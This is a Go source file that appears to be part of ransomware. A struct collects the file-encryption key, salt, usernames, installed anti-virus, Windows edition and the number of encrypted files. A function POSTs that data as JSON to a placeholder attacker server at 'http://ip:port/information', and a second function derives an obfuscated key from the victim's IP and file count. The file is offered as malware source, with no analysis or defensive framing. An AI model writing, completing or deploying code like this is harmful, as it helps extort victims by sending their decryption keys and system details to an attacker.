package main

import (
	"bytes"
	"encoding/json"
	"errors"
	"net/http"
	"strconv"
	"strings"
)

type InformationRequest struct {
	Key                 string `json:"key"`                   // encryption key
	Salt                string `json:"salt"`                  // salt
	Username            string `json:"username"`              // generated username
	SUsername           string `json:"susername"`             // system username
	AntiVirus           string `json:"antivirus"`             // anti-virus
	EncryptedFileAmount int    `json:"encrypted_file_amount"` // amount of encrypted files
	WindowsEdition      string `json:"windows_edition"`       // windows edition
	TimeTaken           string `json:"time_taken"`            // time takens
}

var Numbers = map[string]string{
	"0": "9",
	"1": "8",
	"2": "7",
	"3": "6",
	"4": "5",
	"5": "4",
	"6": "3",
	"7": "2",
	"8": "1",
	"9": "0",
}

func SendInformationRequest(requestInfo *InformationRequest) (bool, error) {
	data, err := json.Marshal(requestInfo)
	if err != nil {
		return false, err
	}
	client := &http.Client{}
	req, err := http.NewRequest(http.MethodPost, "http://ip:port/information", bytes.NewBuffer(data))
	if err != nil {
		return false, err
	}

	req.Header.Set("Content-Type", "application/json")
	//req.Header.Set("Special-Header", GenerateKey(GetPublicIP(), requestInfo.EncryptedFileAmount))

	resp, err := client.Do(req)
	if err != nil {
		return false, err
	}

	if resp.StatusCode != 200 {
		return false, errors.New("error while sending information request, status code: " + strconv.Itoa(resp.StatusCode))
	}
	return true, nil
}

func GenerateKey(Ip string, FilesAmount int) string {
	// Obtain the sum of the first and last 3 digits of FilesAmount
	if FilesAmount < 1000 {
		FilesAmount = 1000
	}
	fileAmountString := strconv.Itoa(FilesAmount)
	firstNumber := fileAmountString[0:1]
	last3Number := fileAmountString[len(fileAmountString)-3:]
	firstNumberInt, _ := strconv.Atoi(firstNumber)
	last3NumberInt, _ := strconv.Atoi(last3Number)
	sum := firstNumberInt + last3NumberInt

	// Get the sum of the IP address parts
	sumOfIP := 0
	ipSplited := strings.Split(Ip, ".")
	for _, v := range ipSplited {
		partInt, _ := strconv.Atoi(v)
		sumOfIP += partInt
	}

	// Generate the key based on the sum's parity
	var key string
	if sum%2 == 0 {
		// If the sum is even, reverse the sumOfIP string
		numberStr := strconv.Itoa(sumOfIP)
		var reversed strings.Builder
		for i := len(numberStr) - 1; i >= 0; i-- {
			reversed.WriteByte(numberStr[i])
		}
		key = reversed.String()
	} else {
		// If the sum is odd, use sumOfIP as is
		key = strconv.Itoa(sumOfIP)
	}
	key = key + "."
	for _, v := range ipSplited {
		for _, v2 := range v {
			key += Numbers[string(v2)]
		}
	}

	return key
}
